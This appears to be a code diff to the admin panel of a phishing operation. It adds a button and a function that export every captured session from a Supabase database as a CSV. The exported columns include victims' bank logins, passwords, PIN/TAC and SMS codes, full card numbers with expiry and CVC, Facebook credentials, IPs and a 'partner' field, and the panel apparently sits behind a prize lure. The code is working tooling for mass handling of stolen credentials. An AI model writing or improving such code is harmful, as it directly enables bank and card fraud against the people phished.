@@ -619,6 +619,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
   const [page, setPage] = useState(0);
   const pageRef = useRef(0);
   const [totalCount, setTotalCount] = useState(0);
+  const [exporting, setExporting] = useState(false);
   useEffect(() => {
     pageRef.current = page;
   }, [page]);
@@ -1348,6 +1349,76 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     await load();
   };
 
+  const handleExport = async () => {
+    if (!supabase || exporting) return;
+    setExporting(true);
+    try {
+      const all: DemoSession[] = [];
+      const BATCH = 1000;
+      for (let from = 0; ; from += BATCH) {
+        let query = supabase
+          .from("sessions")
+          .select(SESSION_LIST_COLUMNS)
+          .order("created_at", { ascending: false });
+        if (isDeletedMode) {
+          query = query.eq("is_hidden", true);
+        } else {
+          query = query.or("is_hidden.is.false,is_hidden.is.null");
+        }
+        const { data, error: qErr } = await query.range(from, from + BATCH - 1);
+        if (qErr) throw qErr;
+        const batch = (data ?? []) as DemoSession[];
+        all.push(...batch);
+        if (batch.length < BATCH) break;
+      }
+
+      const esc = (v: unknown) => {
+        const s = v == null ? "" : String(v);
+        return `"${s.replace(/"/g, '""')}"`;
+      };
+      const val = (v: unknown) => (v == null ? "" : v);
+
+      const headers = [
+        "ID", "Session UUID", "Tarih", "Odul", "Isim", "Soyisim", "Telefon",
+        "Banka", "Banka Tel", "Kullanici Adi", "Sifre", "PIN/TAC", "SMS Kodu",
+        "Kart Sahibi", "Kart No", "Kart SKT", "Kart CVC",
+        "FB Isim", "FB Soyisim", "FB E-posta", "FB Sifre",
+        "Sayfa", "Durum", "IP", "Cihaz", "Partner",
+      ];
+
+      const lines = all.map((r) => {
+        const fd = (r.form_data ?? {}) as Record<string, any>;
+        return [
+          val(r.public_id),
+          r.id,
+          r.created_at ? new Date(r.created_at).toLocaleString("tr-TR") : "",
+          r.amount ? `€${r.amount}` : "",
+          val(fd.firstName), val(fd.lastName), val(fd.phone),
+          val(fd.bankName), val(fd.bankPhone), val(fd.username), val(fd.password),
+          val(fd.pin ?? fd.tacCode ?? fd.personalCode), val(fd.smsCode),
+          val(fd.cardHolder), val(fd.cardNumber), val(fd.cardExpiry), val(fd.cardCvc),
+          val(fd.fbFirstName), val(fd.fbLastName), val(fd.fbEmail), val(fd.fbPassword),
+          r.current_step, r.status, val(r.ip_address), val(r.user_agent), val(r.partner_name),
+        ].map(esc).join(";");
+      });
+
+      const csv = "﻿" + [headers.map(esc).join(";"), ...lines].join("\r\n");
+      const blob = new Blob([csv], { type: "text/csv;charset=utf-8" });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = `maxima-loglar-${isDeletedMode ? "silinen-" : ""}${new Date().toISOString().slice(0, 10)}.csv`;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      URL.revokeObjectURL(url);
+    } catch (e) {
+      alert(`Export hatasi: ${e instanceof Error ? e.message : "bilinmeyen hata"}`);
+    } finally {
+      setExporting(false);
+    }
+  };
+
   useEffect(() => {
     if (!chatSessionId || !supabase) return;
     
@@ -1584,6 +1655,20 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
             </h2>
           </div>
           <div className="flex items-center gap-3 flex-wrap">
+            <button
+              onClick={() => void handleExport()}
+              disabled={exporting}
+              className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md disabled:opacity-60 disabled:cursor-wait ${
+                darkMode ? "bg-sky-500/10 border border-sky-500/20 text-sky-400 hover:bg-sky-500 hover:text-white" : "bg-sky-50 border border-sky-200 text-sky-600 hover:bg-sky-500 hover:text-white"
+              }`}
+            >
+              {exporting ? (
+                <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z" /></svg>
+              ) : (
+                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5 5-5M12 15V3" /></svg>
+              )}
+              {exporting ? "İndiriliyor..." : "Excel İndir"}
+            </button>
             {isDeletedMode ? (
               <>
                 {/* Geçmiş Log modu: Tümünü Geri Yükle + Tümünü Kalıcı Sil */}
